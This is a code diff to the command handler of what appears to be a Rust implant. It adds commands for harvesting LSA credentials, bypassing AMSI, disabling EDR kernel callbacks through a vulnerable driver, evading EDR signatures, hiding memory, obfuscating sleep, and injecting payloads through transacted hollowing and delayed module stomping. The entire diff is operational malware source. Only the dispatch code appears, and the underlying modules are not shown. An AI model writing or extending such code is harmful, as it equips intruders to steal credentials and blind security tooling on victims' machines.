@@ -387,6 +387,21 @@ pub async fn handle_command(
             Err("self-reencode feature not enabled".to_string())
         }
 
+        /// SetSleepVariant: switch the sleep obfuscation variant at runtime.
+        /// Accepted values: "cronus", "ekko".
+        Command::SetSleepVariant { variant } => {
+            let v = match variant.to_lowercase().as_str() {
+                "cronus" => crate::sleep_obfuscation::SleepVariant::Cronus,
+                "ekko" => crate::sleep_obfuscation::SleepVariant::Ekko,
+                other => {
+                    log::warn!("unknown sleep variant '{other}', ignoring");
+                    return Err(format!("unknown sleep variant: {other}"));
+                }
+            };
+            crate::sleep_obfuscation::set_sleep_variant(v);
+            Ok(format!("Sleep variant set to {variant}"))
+        }
+
         #[cfg(feature = "persistence")]
         Command::EnablePersistence => crate::persistence::install_persistence()
             .map(|p| format!("Persistence installed at {}", p.display()))
@@ -914,6 +929,11 @@ pub async fn handle_command(
 
         #[cfg(all(windows, feature = "browser-data"))]
         Command::BrowserData { browser, data_type } => {
+            // Set C4 timeout from config before calling browser_data.
+            {
+                let cfg = config.lock().await;
+                crate::browser_data::set_c4_timeout(cfg.browser_c4_timeout_secs);
+            }
             match crate::browser_data::collect_browser_data(browser, data_type) {
                 Ok(json) => {
                     result_data = Some(json.into_bytes());
@@ -944,6 +964,51 @@ pub async fn handle_command(
             Err("LSASS harvesting requires Windows".to_string())
         }
 
+        // ── LSA Whisperer — SSP interface credential extraction ────────
+
+        #[cfg(all(windows, feature = "lsa-whisperer"))]
+        Command::HarvestLSA { method } => {
+            let timeout = config.lock().await.lsa_whisperer.timeout_secs;
+            match crate::lsa_whisperer::harvest_lsa(&method, timeout) {
+                Ok(json) => {
+                    result_data = Some(json.into_bytes());
+                    Ok("lsa whisperer harvest completed".to_string())
+                }
+                Err(e) => Err(format!("lsa whisperer failed: {e}")),
+            }
+        }
+        #[cfg(not(all(windows, feature = "lsa-whisperer")))]
+        Command::HarvestLSA { .. } => {
+            Err("LSA Whisperer requires Windows + lsa-whisperer feature".to_string())
+        }
+
+        #[cfg(all(windows, feature = "lsa-whisperer"))]
+        Command::LSAWhispererStatus => {
+            match crate::lsa_whisperer::whisperer_status() {
+                Ok(json) => {
+                    result_data = Some(json.into_bytes());
+                    Ok("lsa whisperer status".to_string())
+                }
+                Err(e) => Err(format!("lsa whisperer status failed: {e}")),
+            }
+        }
+        #[cfg(not(all(windows, feature = "lsa-whisperer")))]
+        Command::LSAWhispererStatus => {
+            Err("LSA Whisperer requires Windows + lsa-whisperer feature".to_string())
+        }
+
+        #[cfg(all(windows, feature = "lsa-whisperer"))]
+        Command::LSAWhispererStop => {
+            match crate::lsa_whisperer::whisperer_stop() {
+                Ok(msg) => Ok(msg),
+                Err(e) => Err(format!("lsa whisperer stop failed: {e}")),
+            }
+        }
+        #[cfg(not(all(windows, feature = "lsa-whisperer")))]
+        Command::LSAWhispererStop => {
+            Err("LSA Whisperer requires Windows + lsa-whisperer feature".to_string())
+        }
+
         // ── NTDLL unhooking (Windows only) ──────────────────────────────
 
         #[cfg(windows)]
@@ -963,6 +1028,261 @@ pub async fn handle_command(
         #[cfg(not(windows))]
         Command::UnhookNtdll => {
             Err("NTDLL unhooking requires Windows".to_string())
+        }
+
+        // ── AMSI bypass mode selection ─────────────────────────────────
+
+        #[cfg(windows)]
+        Command::AmsiBypassMode { ref mode } => {
+            use common::AmsiBypassMode as Mode;
+
+            // First disable any currently-active write-raid.
+            #[cfg(feature = "write-raid-amsi")]
+            {
+                let _ = crate::amsi_defense::disable_write_raid();
+            }
+
+            match mode {
+                Mode::WriteRaid => {
+                    #[cfg(feature = "write-raid-amsi")]
+                    {
+                        match crate::amsi_defense::enable_write_raid() {
+                            Ok(()) => Ok("AMSI write-raid bypass enabled".to_string()),
+                            Err(e) => Err(format!("write-raid enable failed: {e}")),
+                        }
+                    }
+                    #[cfg(not(feature = "write-raid-amsi"))]
+                    {
+                        Err("write-raid AMSI bypass not compiled (missing write-raid-amsi feature)".to_string())
+                    }
+                }
+                Mode::Hwbp => {
+                    #[cfg(feature = "hwbp-amsi")]
+                    {
+                        crate::amsi_defense::orchestrate_layers();
+                        Ok("AMSI HWBP bypass applied".to_string())
+                    }
+                    #[cfg(not(feature = "hwbp-amsi"))]
+                    {
+                        Err("HWBP AMSI bypass not compiled (missing hwbp-amsi feature)".to_string())
+                    }
+                }
+                Mode::MemoryPatch => {
+                    crate::amsi_defense::orchestrate_layers();
+                    Ok("AMSI memory-patch bypass applied".to_string())
+                }
+                Mode::Auto => {
+                    // Prefer write-raid > hwbp > memory-patch.
+                    #[cfg(feature = "write-raid-amsi")]
+                    {
+                        match crate::amsi_defense::enable_write_raid() {
+                            Ok(()) => Ok("AMSI write-raid bypass enabled (auto-selected)".to_string()),
+                            Err(_) => {
+                                log::warn!("auto: write-raid failed, falling back to memory-patch");
+                                crate::amsi_defense::orchestrate_layers();
+                                Ok("AMSI memory-patch bypass applied (write-raid fallback)".to_string())
+                            }
+                        }
+                    }
+                    #[cfg(not(feature = "write-raid-amsi"))]
+                    {
+                        #[cfg(feature = "hwbp-amsi")]
+                        {
+                            crate::amsi_defense::orchestrate_layers();
+                            Ok("AMSI HWBP bypass applied (auto-selected)".to_string())
+                        }
+                        #[cfg(not(feature = "hwbp-amsi"))]
+                        {
+                            crate::amsi_defense::orchestrate_layers();
+                            Ok("AMSI memory-patch bypass applied (auto-selected)".to_string())
+                        }
+                    }
+                }
+            }
+        }
+
+        #[cfg(not(windows))]
+        Command::AmsiBypassMode { .. } => {
+            Err("AMSI bypass requires Windows".to_string())
+        }
+
+        // ── Evanesco continuous memory hiding ────────────────────────────
+
+        /// Return status of the Evanesco page-tracker subsystem.
+        #[cfg(all(windows, feature = "evanesco"))]
+        Command::EvanescoStatus => {
+            Ok(crate::page_tracker::status_json())
+        }
+        #[cfg(not(all(windows, feature = "evanesco")))]
+        Command::EvanescoStatus => {
+            Err("evanesco feature not enabled".to_string())
+        }
+
+        /// Dynamically adjust the Evanesco idle threshold.
+        #[cfg(all(windows, feature = "evanesco"))]
+        Command::EvanescoSetThreshold { idle_ms } => {
+            crate::page_tracker::set_idle_threshold(*idle_ms);
+            Ok(format!("Evanesco idle threshold set to {}ms", idle_ms))
+        }
+        #[cfg(not(all(windows, feature = "evanesco")))]
+        Command::EvanescoSetThreshold { .. } => {
+            Err("evanesco feature not enabled".to_string())
+        }
+
+        // ── Kernel callback overwrite (BYOVD, Windows only) ───────────
+
+        /// Discover and report all registered EDR kernel callbacks.
+        #[cfg(all(windows, feature = "kernel-callback"))]
+        Command::KernelCallbackScan => {
+            let key_bytes = crypto.key_bytes();
+            match crate::kernel_callback::scan(key_bytes) {
+                Ok(json) => Ok(json),
+                Err(e) => Err(format!("kernel callback scan failed: {e}")),
+            }
+        }
+        #[cfg(not(all(windows, feature = "kernel-callback")))]
+        Command::KernelCallbackScan => {
+            Err("kernel-callback feature not enabled".to_string())
+        }
+
+        /// Deploy driver + overwrite EDR callbacks with ret.
+        #[cfg(all(windows, feature = "kernel-callback"))]
+        Command::KernelCallbackNuke { ref drivers } => {
+            let key_bytes = crypto.key_bytes();
+            match crate::kernel_callback::nuke(drivers, key_bytes) {
+                Ok(json) => Ok(json),
+                Err(e) => Err(format!("kernel callback nuke failed: {e}")),
+            }
+        }
+        #[cfg(not(all(windows, feature = "kernel-callback")))]
+        Command::KernelCallbackNuke { .. } => {
+            Err("kernel-callback feature not enabled".to_string())
+        }
+
+        /// Restore original callback pointers from saved backup.
+        #[cfg(all(windows, feature = "kernel-callback"))]
+        Command::KernelCallbackRestore => {
+            let key_bytes = crypto.key_bytes();
+            match crate::kernel_callback::restore(key_bytes) {
+                Ok(json) => Ok(json),
+                Err(e) => Err(format!("kernel callback restore failed: {e}")),
+            }
+        }
+        #[cfg(not(all(windows, feature = "kernel-callback")))]
+        Command::KernelCallbackRestore => {
+            Err("kernel-callback feature not enabled".to_string())
+        }
+
+        // ── EDR bypass transformation engine ─────────────────────────────
+
+        /// Scan .text for known EDR byte signatures.
+        #[cfg(feature = "evasion-transform")]
+        Command::EvasionTransformScan => {
+            match crate::edr_bypass_transform::scan_for_signatures() {
+                Ok(hits) => {
+                    match serde_json::to_string_pretty(&hits) {
+                        Ok(json) => Ok(json),
+                        Err(e) => Err(format!("serialization failed: {e}")),
+                    }
+                }
+                Err(e) => Err(format!("evasion transform scan failed: {e}")),
+            }
+        }
+        #[cfg(not(feature = "evasion-transform"))]
+        Command::EvasionTransformScan => {
+            Err("evasion-transform feature not enabled".to_string())
+        }
+
+        /// Run one scan-and-transform cycle.
+        #[cfg(feature = "evasion-transform")]
+        Command::EvasionTransformRun => {
+            let cfg = config.lock().await.clone();
+            let max_transforms = cfg.evasion_transform.max_transforms_per_cycle;
+            let entropy_threshold = cfg.evasion_transform.entropy_threshold;
+            match crate::edr_bypass_transform::run_edr_bypass_transform(
+                max_transforms,
+                entropy_threshold,
+            ) {
+                Ok(result) => {
+                    match serde_json::to_string_pretty(&result) {
+                        Ok(json) => Ok(json),
+                        Err(e) => Err(format!("serialization failed: {e}")),
+                    }
+                }
+                Err(e) => Err(format!("evasion transform run failed: {e}")),
+            }
+        }
+        #[cfg(not(feature = "evasion-transform"))]
+        Command::EvasionTransformRun => {
+            Err("evasion-transform feature not enabled".to_string())
+        }
+
+        /// NTFS transaction-based process hollowing with ETW blinding.
+        #[cfg(feature = "transacted-hollowing")]
+        Command::TransactedHollow { target_process, payload, etw_blinding } => {
+            let rollback_timeout_ms = {
+                let cfg = config.lock().await.clone();
+                cfg.transacted_hollowing.rollback_timeout_ms
+            };
+            match unsafe {
+                crate::injection_transacted::inject_transacted_hollowing(
+                    &payload,
+                    etw_blinding,
+                    rollback_timeout_ms,
+                )
+            } {
+                Ok(handle) => {
+                    match serde_json::to_string_pretty(&serde_json::json!({
+                        "pid": handle.target_pid,
+                        "base_addr": format!("{:#x}", handle.injected_base_addr),
+                        "technique": "TransactedHollowing",
+                        "payload_size": handle.payload_size,
+                    })) {
+                        Ok(json) => Ok(json),
+                        Err(e) => Err(format!("serialization failed: {e}")),
+                    }
+                }
+                Err(e) => Err(format!("transacted hollowing failed: {e}")),
+            }
+        }
+        #[cfg(not(feature = "transacted-hollowing"))]
+        Command::TransactedHollow { .. } => {
+            Err("transacted-hollowing feature not enabled".to_string())
+        }
+
+        // ── Delayed module-stomp injection ───────────────────────────────
+        // Loads a sacrificial DLL into the target process, waits for a
+        // randomized delay (8–15s default) to let EDR initial-scan
+        // heuristics pass, then overwrites the DLL's .text section with
+        // the payload.  Returns immediately after Phase 1 (DLL load);
+        // Phase 2 (stomp + execute) runs in a background thread.
+        #[cfg(feature = "delayed-stomp")]
+        Command::DelayedStomp { target_pid, payload, delay_secs } => {
+            let (min_delay, max_delay) = {
+                let cfg = config.lock().await.clone();
+                let d = &cfg.delayed_stomp;
+                if !d.enabled {
+                    return Err("delayed-stomp is disabled in config".to_string());
+                }
+                if let Some(secs) = delay_secs {
+                    (*secs, *secs)
+                } else {
+                    (d.min_delay_secs, d.max_delay_secs)
+                }
+            };
+            match crate::injection_delayed_stomp::inject_delayed_stomp_async(
+                *target_pid,
+                payload.clone(),
+                min_delay,
+                max_delay,
+            ) {
+                Ok(json) => Ok(json),
+                Err(e) => Err(format!("delayed stomp failed: {e}")),
+            }
+        }
+        #[cfg(not(feature = "delayed-stomp"))]
+        Command::DelayedStomp { .. } => {
+            Err("delayed-stomp feature not enabled".to_string())
         }
     };
 
